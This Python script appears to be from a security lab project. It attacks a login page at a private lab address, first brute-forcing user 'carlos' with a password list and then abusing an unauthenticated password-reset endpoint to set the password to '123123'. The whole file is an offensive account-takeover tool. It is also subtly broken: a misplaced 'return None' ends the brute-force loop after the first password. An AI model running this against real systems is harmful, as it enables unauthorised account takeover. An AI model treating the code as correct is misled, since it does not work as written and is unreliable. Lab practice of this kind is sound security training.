import requests

DEFAULT_BASE = "http://192.168.56.1/CyberProject/" 

def try_brute_force(user="carlos", filename="passwords.txt", base_url=DEFAULT_BASE):
    login_url = base_url + "login.php"
    print(f"[*] Step 1: Starting Brute Force for {user} from file: {filename}")
    
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                # remove any whitespace characters from the password
                password = line.strip()
                if not password:
                    continue
                
                data = {
                    'username': user,
                    'password': password,
                    'login_submit': ''
                }
                
                try:
                    # use timeout to prevent hanging on slow responses
                    response = requests.post(login_url, data=data, allow_redirects=False, timeout=5)
                    
                    if response.status_code == 302 or "home.php" in response.headers.get('Location', ''):
                        print(f"\n[!!!] SUCCESS! Found password in file: {password}")
                        return password
                        
                except requests.exceptions.RequestException:
                    print(f"[!] Connection error testing password: {password}")
                    continue

                return None
                    
    except FileNotFoundError:
        print(f"[!] Error: The file {filename} was not found.")

    print("[-] Brute force finished. No password from the file worked.")
    return None

def run_reset_password(user="carlos", new_pwd="123123", base_url=DEFAULT_BASE):
    reset_url = base_url + "reset_password.php"
    print(f"\n[*] Step 2: Falling back to Broken Password Reset...")
    params = {'user': user}
    data = {'new_password': new_pwd}
    
    try:
        response = requests.post(reset_url, params=params, data=data)
        if response.status_code == 200 and f"<strong>{user}</strong>" in response.text:
            print(f"[+] Reset successful! New password: {new_pwd}")
            return new_pwd
        else:
            print("[-] Reset attack failed.")
    except Exception as e:
        print(f"[!] Connection error: {e}")
    return None

def standalone_attack(target="carlos"):
    pwd = try_brute_force(user=target)
    if not pwd:
        pwd = run_reset_password(user=target)
    return pwd

if __name__ == "__main__":
    standalone_attack()